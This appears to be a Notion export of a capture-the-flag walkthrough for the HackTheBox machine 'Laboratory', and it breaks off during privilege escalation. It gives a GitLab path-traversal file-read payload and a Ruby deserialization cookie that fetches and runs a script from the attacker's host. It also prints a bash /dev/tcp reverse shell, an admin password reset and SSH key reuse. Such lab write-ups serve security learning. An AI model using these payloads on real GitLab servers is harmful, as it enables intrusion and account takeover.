{"children":[{"children":[],"uri":"https://www.notion.so/42fcb8fb24084cf39ab4ccb6b30ec298","type":"heading","createdTime":1618674986206,"lastEditedTime":1618674986206,"title":[["Recon"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/a693fe9797e741938f6e70903212423f","type":"text","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["$ nmap -p- 10.10.10.216 > ports.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/126e4c743dcc4724bef7c86a63131b38","type":"code","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["PORT    STATE SERVICE\n22/tcp  open  ssh\n80/tcp  open  http\n443/tcp open  https"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/6d548fc74ea948359504fddd3aad37d4","type":"bulleted_list","createdTime":1618674986205,"lastEditedTime":1618674986205,"title":[["Port scan:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/89cd967896f740f4a153d47a4fc7dc9d","type":"text","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["$ nmap -sC -sV -p 22,80,443 10.10.10.216 > targeted.nmap",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/60b5daf539024c5bb9b46dd04aec5ba3","type":"code","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["PORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey: \n|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)\n|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)\n|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.41\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to https://laboratory.htb/\n443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: The Laboratory\n| ssl-cert: Subject: commonName=laboratory.htb\n| Subject Alternative Name: DNS:git.laboratory.htb\n| Not valid before: 2020-07-05T10:39:28\n|_Not valid after:  2024-03-03T10:39:28\n| tls-alpn: \n|_  http/1.1"]],"language":"Nix","wrap":false},{"children":[],"uri":"https://www.notion.so/ddf6ba0afc5e4f03a55dade459d5d262","type":"text","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["SSH, Apache HTTP, Apache SSL/HTTP."]]}],"uri":"https://www.notion.so/20f434eef74f4c93a83ab7f7a4e23fc2","type":"bulleted_list","createdTime":1618674986236,"lastEditedTime":1618674986236,"title":[["Targeted scan:"]]},{"children":[],"uri":"https://www.notion.so/4bbe4160465b4f09949aec5141f2bf1a","type":"heading","createdTime":1618674986206,"lastEditedTime":1618674986206,"title":[["Enumeration"]],"depth":2},{"children":[],"uri":"https://www.notion.so/8e78be5eeeb34812ac93003c09f8d2a3","type":"text","createdTime":1618674986237,"lastEditedTime":1618674986237,"title":[["HTTP Enumeration",[["b",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/e2a346a4c8a54f01b07cdbef514f3aa5","type":"text","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["10.10.10.216  laboratory.htb",[["c",null]]]]}],"uri":"https://www.notion.so/bad9ffab75a8459bb49150aa591cc321","type":"bulleted_list","createdTime":1618674986237,"lastEditedTime":1618674986237,"title":[["HTTP automatically redirects to "],["laboratory.htb",[["c",null]]],[", add domain names to "],["/etc/hosts",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/a7680eb19a254399a0d8d8b024eea30e","type":"code","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Subject Alternative Name: DNS:git.laboratory.htb"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/f7baeb3ed59b472e9d72c8472e911e40","type":"bulleted_list","createdTime":1618674986205,"lastEditedTime":1618674986205,"title":[["From the targeted scan, we also see that there is a git subdomain:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/54fd3bee15c24158b1d038cb473d4add","type":"text","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["10.10.10.216  laboratory.htb  git.laboratory.htb",[["c",null]]]]}],"uri":"https://www.notion.so/e16bb267acc94bba826def8b1c06aa33","type":"bulleted_list","createdTime":1618674986237,"lastEditedTime":1618674986237,"title":[["Add the subdomain to the line in "],["/etc/hosts",[["c",null]]],[" as well:"]]},{"children":[],"uri":"https://www.notion.so/f90d8d96daf7411380f55da65833c8c2","type":"bulleted_list","createdTime":1618674986206,"lastEditedTime":1618674986206,"title":[["Laboratory CEO's name is \"Dexter\", potential username."]]},{"children":[],"uri":"https://www.notion.so/b5e80e78f18c4566a8633fb8d5292876","type":"text","createdTime":1618674986238,"lastEditedTime":1618674986238,"title":[["HTTPS Enumeration",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/d36367cd28fc480eb24ceaa381055fb7","type":"bulleted_list","createdTime":1618674986206,"lastEditedTime":1618674986206,"title":[["Port 443 is hosting a GitLab repository."]]},{"children":[{"children":[],"uri":"https://www.notion.so/88b4421eba1d4c5e88c32d7a8122dd94","type":"text","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["https://git.laboratory.htb/users/sign_in",[["a","https://git.laboratory.htb/users/sign_in"]]]]}],"uri":"https://www.notion.so/9773837baadf4e099db52add239a8f60","type":"bulleted_list","createdTime":1618674986236,"lastEditedTime":1618674986236,"title":[["GitLab login page:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/2372214875bb43328969cc9d0f39ffd0","type":"code","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["1 error prohibited this user from being saved:\nEmail domain is not authorized for sign-up"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/e84348f2d39349a58101635c2be3991c","type":"bulleted_list","createdTime":1618674986236,"lastEditedTime":1618674986236,"title":[["Attempt to register for an account:"]]},{"children":[],"uri":"https://www.notion.so/cb272228d7774251a6fc220c853945d1","type":"bulleted_list","createdTime":1618674986207,"lastEditedTime":1618674986207,"title":[["Attempting to register again with "],["@laboratory.htb",[["c",null]]],[" email address, was redirected to "],["git.laboratory.htb/users",[["c",null]]],[" which 404'd."]]},{"children":[],"uri":"https://www.notion.so/f853e56e67ce43df9364696628e5b49b","type":"bulleted_list","createdTime":1618674986206,"lastEditedTime":1618674986206,"title":[["Navigating back to homepage, we see that we're registered and have logged in successfully. No email verification was necessary."]]},{"children":[],"uri":"https://www.notion.so/7dc6ffb4a6a7444fb9ea93b0dc727079","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["Version info is exposed on "],["https://git.laboratory.htb/help",[["a","https://git.laboratory.htb/help"]]],[", the server is running GitLab Community Edition 12.8.1."]]},{"children":[],"uri":"https://www.notion.so/3aa9db6a3422439c856a0e3241836cf8","type":"bulleted_list","createdTime":1618674988797,"lastEditedTime":1618674988797,"title":[["This version of GitLab is newer than the previously similar box, "],["Ready",[["a","/f6e936bd2d9849aeb0c3f774cb5e1f53"]]],[", and is not vulnerable to the same Webhooks SSRF and CRLF injection."]]},{"children":[],"uri":"https://www.notion.so/2cfdc82acaab4dc0a5c0ea6c3c63acd5","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["However, it is vulnerable to a different local file inclusion (LFI) attack, specifically in the "],["UploadsRewriter",[["c",null]]],[" module."]]},{"children":[],"uri":"https://www.notion.so/335a26b93ed947a0bf70be94f5b266b0","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["File names and paths of upload attachments are not checked when copying an issue between projects, which allows us to read arbitrary files on the server."]]},{"children":[],"uri":"https://www.notion.so/1e04844e7fa44a248bf8353c96a4f9ec","type":"heading","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["Exploitation"]],"depth":2},{"children":[],"uri":"https://www.notion.so/7ecdea64af43422687d854e19985e223","type":"text","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Exploiting LFI in GitLab",[["b",null]]]]},{"children":[],"uri":"https://www.notion.so/241b516d19bb44e3b90c4fc4ff5501cc","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["While there is a Metasploit module ("],["multi/http/gitlab_file_read_rce",[["c",null]]],[") which can automate the exploit, let us do the exploit manually this time."]]},{"children":[{"children":[],"uri":"https://www.notion.so/468cc9efa61f498bb0188d72375ac481","type":"code","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../PATH_TO_FILE)"]],"language":"Markdown","wrap":false}],"uri":"https://www.notion.so/f0244f62dac849e18f6575f9ad9058c3","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["According to the HackerOne report on this vulnerability, it is possible to read local files using the upload string:"]]},{"children":[],"uri":"https://www.notion.so/2009fab366ae421eaa311c355b913aa8","type":"bulleted_list","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["We can turn this LFI attack into an RCE as the "],["cookies_serializer",[["c",null]]],[" is set to the unsafe option "],["hybrid",[["c",null]]],[" by default."]]},{"children":[],"uri":"https://www.notion.so/70acb204d57f413c84503f298b6042bc","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Payloads can be sent by changing our own local GitLab instance's secret_key_base to match the target's."]]},{"children":[{"children":[],"uri":"https://www.notion.so/6b159b70dd2e4efebdd4b788154211a9","type":"code","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["![a](/uploads/11111111111111111111111111111111/../../../../../../../../../../../../../../opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml)"]],"language":"Markdown","wrap":false}],"uri":"https://www.notion.so/03cdb8b26a5b4fa78e84eec17c26e9c4","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Target "],["secret_key_base",[["c",null]]],[" can be found by reading "],["/opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/b65906bf09e446ba8ecba857641172e6","type":"code","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/ccf2040c0940446a8f840b55233ecb40","type":"bulleted_list","createdTime":1618674986312,"lastEditedTime":1618674986312,"title":[["Download "],["secrets.yml",[["c",null]]],[" from moved issue, and we can obtain the target's "],["secret_key_base",[["c",null]]],[":"]]},{"children":[],"uri":"https://www.notion.so/30122061e45343cfb69817466da1fa07","type":"text","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["Setting up our own GitLab instance",[["b",null]]]]},{"children":[{"children":[],"uri":"https://www.notion.so/cc8ebb1b35404bc6872b658178b1cac5","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["$ sudo pacman -S docker",[["c",null]]]]}],"uri":"https://www.notion.so/f30206d0999c485089141478f2bb6221","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["Install Docker:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1a995fc99bf44fee8cda6af1c5a49047","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["$ sudo systemctl start docker",[["c",null]]]]}],"uri":"https://www.notion.so/7571a40d58b449eca04b1b5e41ebeed2","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Start Docker daemon:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/64bd48f641ca4c5e96f835828d34f713","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["$ sudo docker pull gitlab/gitlab-ce:12.8.1-ce.0",[["c",null]]]]}],"uri":"https://www.notion.so/729d1078d5f142d59aa1f09c354f0225","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Pull vulnerable version of GitLab from repository:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/30112b9e12954a2699c41ca3f4d725c0","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ mkdir /srv/gitlab",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/d2f58f6db76e451595af786f97784fe1","type":"text","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["$ export GITLAB_HOME=/srv/gitlab",[["c",null]]]]}],"uri":"https://www.notion.so/0c8e866557514d7aa0bc46db846dbf7a","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["Set up $GITLAB_HOME:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/1dcf340667b0401eb75b553095df36fe","type":"text","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["$ sudo docker run --detach \\\n--hostname git.laboratory.htb \\\n--publish 443:443 --publish 80:80 --publish 22:22 \\\n--name gitlab \\\n--restart always \\\n--volume $GITLAB_HOME/config:/etc/gitlab:Z \\\n--volume $GITLAB_HOME/logs:/var/log/gitlab:Z \\\n--volume $GITLAB_HOME/data:/var/opt/gitlab:Z \\\ngitlab/gitlab-ce:12.8.1-ce.0",[["c",null]]]]}],"uri":"https://www.notion.so/0578982eab2e46bfade82d7fec98a395","type":"bulleted_list","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["Start GitLab container:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/34d7330485ac42d3b1ba8e0ec0ff00a5","type":"text","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["$ sudo docker ps",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/40f382713f454b9dbfcce00361ab70c8","type":"code","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["CONTAINER ID   IMAGE                          COMMAND             CREATED          STATUS                             PORTS                                                          NAMES\ndffc9c86e108   gitlab/gitlab-ce:12.8.1-ce.0   \"/assets/wrapper\"   40 seconds ago   Up 38 seconds (health: starting)   0.0.0.0:22->22/tcp, 0.0.0.0:80->80/tcp, 0.0.0.0:443->443/tcp   gitlab"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/86e4fb82ec1849bf872f7eb645359171","type":"bulleted_list","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["Check whether if container is running:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/a9eb2e56b5ca4164802ada9763aed7dd","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ sudo docker exec -it gitlab /bin/bash",[["c",null]]]]}],"uri":"https://www.notion.so/2ee932b5fcfe4323adaf64dcdc4475f7","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Now that the container is running, we can get a bash shell in the container:"]]},{"children":[],"uri":"https://www.notion.so/30dfd26f76234a3d9268b06ddf0c3acd","type":"bulleted_list","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["Navigate to "],["/opt/gitlab/embedded/service/gitlab-rails/config/",[["c",null]]],[", replace the "],["secret_key_base",[["c",null]]],[" in "],["secrets.yml",[["c",null]]],[" with our target's key."]]},{"children":[{"children":[],"uri":"https://www.notion.so/314d133fb9fa479293076891add566c5","type":"text","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["$ gitlab-ctl reconfigure",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/e54053dad27a4e18a2abd04a2925c0b2","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ gitlab-ctl restart",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/d2764e5819e5497d874b1b8683239bcd","type":"text","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["(Unicorn service may become stuck, kill and restart if needed)"]]}],"uri":"https://www.notion.so/6b56aa3d4c884554886760c76602e618","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Reconfigure and restart GitLab:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/9f301befbc23484397323fe0eaba6a67","type":"text","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["$ gitlab-rails console",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/cf88a0c6668f4a91b8036a4919edebcc","type":"code","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["--------------------------------------------------------------------------------\nGitLab:       12.8.1 (d18b43a5f5a) FOSS\nGitLab Shell: 11.0.0\nPostgreSQL:   10.12\n--------------------------------------------------------------------------------\nLoading production environment (Rails 6.0.2)\nirb(main):001:0> _"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/239b628408274c1c880710dcfe43f16d","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["Start up GitLab console:"]]},{"children":[],"uri":"https://www.notion.so/f792880918334c788395fd8a4cef2eb6","type":"bulleted_list","createdTime":1618674986312,"lastEditedTime":1618674986312,"title":[["We can see that the version info matches our victim's, meaning we have installed the correct version."]]},{"children":[],"uri":"https://www.notion.so/d97606dbc3fb483bb9f805bc7985dac7","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["From here, we can serialise our payload into a cookie, and send it to the target to exploit the LFI vulnerability remotely."]]},{"children":[{"children":[],"uri":"https://www.notion.so/b956eaf7463d43af837ea99a3aa5d701","type":"code","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["request = ActionDispatch::Request.new(Rails.application.env_config)\nrequest.env[\"action_dispatch.cookies_serializer\"] = :marshal\ncookies = request.cookie_jar\nerb = ERB.new(\"<%= `wget http://10.10.14.103:9090/reverse.sh && chmod +x reverse.sh && ./reverse.sh` %>\")\ndepr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new(erb, :result, \"@result\", ActiveSupport::Deprecation.new)\ncookies.signed[:cookie] = depr\nputs cookies[:cookie]"]],"language":"Ruby","wrap":false}],"uri":"https://www.notion.so/4309278e556c42569748c220dae6e848","type":"bulleted_list","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["In our "],["gitlab-rails",[["c",null]]],[" console, we can generate the payload cookie with:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/05da6e26c32249c088e237f33a1c8256","type":"code","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["#!/bin/bash\nbash -i >& /dev/tcp/10.10.14.103/6969 0>&1"]],"language":"Bash","wrap":false}],"uri":"https://www.notion.so/3501907c9cfd46038ed40a189e7c8769","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["Create a simple reverse shell script, and host it on HTTP with "],["updog",[["c",null]]],[":"]]},{"children":[{"children":[],"uri":"https://www.notion.so/4dd325430cac407b9894ef225364bb18","type":"text","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["$ nc -lvnp 6969",[["c",null]]]]}],"uri":"https://www.notion.so/052fb3aeb39d4fa9a75fdb8bc87d27e2","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Listen for incoming shell connection with netcat:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/90051d2e60da4ad3bb93f327135a51ca","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["$ curl -vvv 'https://git.laboratory.htb/users/sign_in' -b \"experimentation_subject_id=BAhvOkBBY3RpdmVTdXBwb3J0OjpEZXByZWNhdGlvbjo6RGVwcmVjYXRlZEluc3RhbmNlVmFyaWFibGVQcm94eQk6DkBpbnN0YW5jZW86CEVSQgs6EEBzYWZlX2xldmVsMDoJQHNyY0kiAYwjY29kaW5nOlVURi04Cl9lcmJvdXQgPSArJyc7IF9lcmJvdXQuPDwoKCBgd2dldCBodHRwOi8vMTAuMTAuMTQuMTAzOjkwOTAvcmV2ZXJzZS5zaCAmJiBjaG1vZCAreCByZXZlcnNlLnNoICYmIC4vcmV2ZXJzZS5zaGAgKS50b19zKTsgX2VyYm91dAY6BkVGOg5AZW5jb2RpbmdJdToNRW5jb2RpbmcKVVRGLTgGOwpGOhNAZnJvemVuX3N0cmluZzA6DkBmaWxlbmFtZTA6DEBsaW5lbm9pADoMQG1ldGhvZDoLcmVzdWx0OglAdmFySSIMQHJlc3VsdAY7ClQ6EEBkZXByZWNhdG9ySXU6H0FjdGl2ZVN1cHBvcnQ6OkRlcHJlY2F0aW9uAAY7ClQ=--db75c853cd72781d87505f46671012d391cfaccc\" -k",[["c",null]]]]}],"uri":"https://www.notion.so/f89134f9057949c599aa857f6333fc34","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Send the cookie under "],["experimentation_subject_id",[["c",null]]],[" field using "],["curl",[["c",null]]],[", don't forget the "],["-k",[["c",null]]],[" option at the end to disable SSL checks:"]]},{"children":[],"uri":"https://www.notion.so/43f8e4a843c949d591c6729b75fae6fa","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["We should get a shell as git, inside the GitLab docker container."]]},{"children":[{"children":[],"uri":"https://www.notion.so/63e71707399c48989ee53cdc8ba79988","type":"text","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["$ gitlab-rails console",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/21ee5f7ef82142349998a28bb596b9f5","type":"code","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["user = User.where(id: 1).first\nuser.password = 'mango123!'\nuser.password_confirmation = 'mango123!'\nuser.save!"]],"language":"Ruby","wrap":false}],"uri":"https://www.notion.so/62c52289b39748fa917c4a2a295e4904","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["As the git user has write access to the GitLab system, we can change Dexter's GitLab password using the gitlab-rails console:"]]},{"children":[],"uri":"https://www.notion.so/49e8a89d309e40c0beb60d12ebd1f8af","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Changed GitLab credentials:\n"],["dexter:mango123!",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/f3f8e6fedbf341dd82a77b20d0aa62d5","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Login to Dexter's GitLab account, and we find his SSH keys are stored in the SecureDocker repository, under the "],["./dexter/.ssh",[["c",null]]],[" directory."]]},{"children":[],"uri":"https://www.notion.so/daf24bc63b234fcba5423e2ad3ea4469","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Download the repository as a zip, and extract the contents."]]},{"children":[{"children":[],"uri":"https://www.notion.so/11394f09c50e43c2a06b0c27d55cd602","type":"text","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["$ chmod 600 ./securedocker-master-dexter/dexter/.ssh/id_rsa",[["c",null]]]]}],"uri":"https://www.notion.so/bb3f81a99cdf461cafcf87bbf2b94831","type":"bulleted_list","createdTime":1618674986306,"lastEditedTime":1618674986306,"title":[["Before we SSH, we have to change the file permissions of id_rsa key to the appropriate values:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/772c0fda429b4d8b8fe1f2400649523a","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ ssh -i ./securedocker-master-dexter/dexter/.ssh/id_rsa dexter@10.10.10.216",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/73623652e770429691a088723857e562","type":"code","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Load key \"./securedocker-master-dexter/dexter/.ssh/id.rsa\": invalid format\n"],["dexter@10.10.10.216",[["a","mailto:dexter@10.10.10.216"]]],[": Permission denied (publickey)."]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/845516eab4b4495babe25fb6dc2bf844","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["SSH in as dexter:"]]},{"children":[],"uri":"https://www.notion.so/04300be17e5d4489a2d6d3ea22b898f5","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Strange, after a bit of searching, it seems like the GitLab "],["id_rsa",[["c",null]]],[" files tend to fail because of a missing line break at the EOF."]]},{"children":[{"children":[],"uri":"https://www.notion.so/c1b6da25e218450b8205153c119e6be2","type":"text","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["$ whoami && id",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/3a02780a48cd4e6eac6c38c694c32ff1","type":"code","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["dexter\nuid=1000(dexter) gid=1000(dexter) groups=1000(dexter)"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/11facdc58a2d4326aeae0cacacb83202","type":"bulleted_list","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["Retry after adding the line break:"]]},{"children":[],"uri":"https://www.notion.so/cf2df0ae9560499ab480f433527a5538","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["Get user flag!"]]},{"children":[],"uri":"https://www.notion.so/9ef0386457e1471495606e1199e54bf9","type":"heading","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["Privilege Escalation"]],"depth":2},{"children":[{"children":[],"uri":"https://www.notion.so/224933c11aca46099de7f3e278b165bc","type":"code","createdTime":1618674986314,"lastEditedTime":1618674986314,"title":[["# DONE: Secure docker for regular users\n### DONE: Automate docker security on startup\n# TODO: Look into \"docker compose\"\n# TODO: Permanently ban DeeDee from lab"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/8a4b371e08b94973abd30d43e6d3113c","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["Along with the SSH keys, we also find a "],["todo.txt",[["c",null]]],[" file under "],["./dexter/",[["c",null]]],[" of the SecureDocker repository:"]]},{"children":[],"uri":"https://www.notion.so/38aedd81b6b6416085d6f590145007cc","type":"bulleted_list","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["We find out that there is a \"docker security\" module that's scheduled to automatically trigger on start-up."]]},{"children":[],"uri":"https://www.notion.so/736d6672adcc44978663e21339a8252c","type":"bulleted_list","createdTime":1618674986311,"lastEditedTime":1618674986311,"title":[["If this module has privileged access and Dexter has write access to it, we can leverage this to execute arbitrary code as root."]]},{"children":[],"uri":"https://www.notion.so/d5529cd9e1e64777a8efe6b431ff8e79","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["We also find out about another user called \"DeeDee\" (also mentioned on homepage) who has yet to be banned, perhaps he/she has unrevoked privileged access?"]]},{"children":[{"children":[],"uri":"https://www.notion.so/aa57f11232d5456da6ab29784dad5ece","type":"text","createdTime":1618674986309,"lastEditedTime":1618674986309,"title":[["$ file / -perm -4000 2>/dev/null",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/6494572ed9604003a124e8b32a931d21","type":"code","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["/usr/local/bin/docker-security"]],"language":"Plain Text","wrap":false}],"uri":"https://www.notion.so/71cdc3fad05a4407a5708112c575d99c","type":"bulleted_list","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["Finding privileged files:"]]},{"children":[{"children":[],"uri":"https://www.notion.so/097333ee138a416c9ac0b947d159931b","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["`$ stat /usr/local/bin/docker-security`"]]},{"children":[],"uri":"https://www.notion.so/643bcd62d31a4343a6fc4c8bd98f4a71","type":"code","createdTime":1618674986308,"lastEditedTime":1618674986308,"title":[["  File: /usr/local/bin/docker-security\n  Size: 16720           Blocks: 40         IO Block: 4096   regular file\nDevice: fd00h/64768d    Inode: 7838        Links: 1\nAccess: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: ( 1000/  dexter)\nAccess: 2021-01-22 05:26:56.593557861 +0000\nModify: 2020-08-28 14:52:07.000000000 +0000\nChange: 2020-08-28 15:59:35.508011813 +0000\n Birth: -"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/59b8b383f6e543f1a798fd1fd957dd28","type":"bulleted_list","createdTime":1618674986310,"lastEditedTime":1618674986310,"title":[["We have found our file of interest, looking deeper:"]]},{"children":[],"uri":"https://www.notion.so/5fa0e2fcf5674b18b9145fbaa676db24","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["Upon executing the binary, nothing outputs nor are any files created."]]},{"children":[{"children":[],"uri":"https://www.notion.so/5951b3c4250a4a149c6179d5593eff25","type":"text","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["$ ltrace ./docker-security",[["c",null]]]]},{"children":[],"uri":"https://www.notion.so/9b7a4fec852b4092b2924e97c3409696","type":"code","createdTime":1618674986312,"lastEditedTime":1618674986312,"title":[["setuid(0)                                                           = -1\nsetgid(0)                                                           = -1\nsystem(\"chmod 700 /usr/bin/docker\"chmod: changing permissions of '/usr/bin/docker': Operation not permitted\n <no return ...>\n--- SIGCHLD (Child exited) ---\n<... system resumed> )                                              = 256\nsystem(\"chmod 660 /var/run/docker.sock\"chmod: changing permissions of '/var/run/docker.sock': Operation not permitted\n <no return ...>\n--- SIGCHLD (Child exited) ---\n<... system resumed> )                                              = 256\n+++ exited (status 0) +++"]],"language":"Nix","wrap":false}],"uri":"https://www.notion.so/604b4ad355be455dbef18cfa835fc5c5","type":"bulleted_list","createdTime":1618674986307,"lastEditedTime":1618674986307,"title":[["We can debug it further using the Linux utility "],["ltrace",[["c",null]]],[", which displays the calls a userspace application makes to other shared libraries:"]]},{"children":[],"uri":"https://www.notion.so/3209f5fa42b74a34bcbf31a346d9dcff","type":"bulleted_list","createdTime":1618674986313,"lastEditedTime":1618674986313,"title":[["We see that the binary first sets the UID and GID on execution to "],["0",[["c",null]]],[", which is reserved for the root user and 